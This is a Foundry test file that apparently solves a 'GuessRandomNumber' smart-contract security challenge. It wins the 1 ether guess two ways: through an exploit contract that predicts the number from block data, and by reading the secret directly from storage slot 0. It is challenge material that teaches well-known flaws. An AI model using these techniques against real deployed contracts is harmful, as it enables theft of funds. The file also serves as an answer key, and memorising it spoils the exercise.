// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";
import "../src/GuessRandomNumber.sol";

contract GuessRandomNumberTest is Test {
    using stdStorage for StdStorage;

    GuessRandomNumber public guessRandomNumber;
    ExploitContract public exploitContract;

    function setUp() public {}

    function testAnswer(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        guessRandomNumber = (new GuessRandomNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
        uint8 guess = exploitContract.Exploit(blockNumber, blockTimestamp);
        guessRandomNumber.guess{value: 1 ether}(guess);

        _checkSolved();
    }

    function testAnswer2(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);       

        // Place your solution here
        guessRandomNumber = (new GuessRandomNumber){value: 1 ether}();
        
        bytes32 slot0 = vm.load(address(guessRandomNumber), 0);
        uint8 guess = uint8(uint256(slot0));
        console.log("Read storage slot 0, random number is %s.", guess);
        guessRandomNumber.guess{value: 1 ether}(guess);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(guessRandomNumber.isComplete(), "Wrong Number");
    }

    receive() external payable {}
}
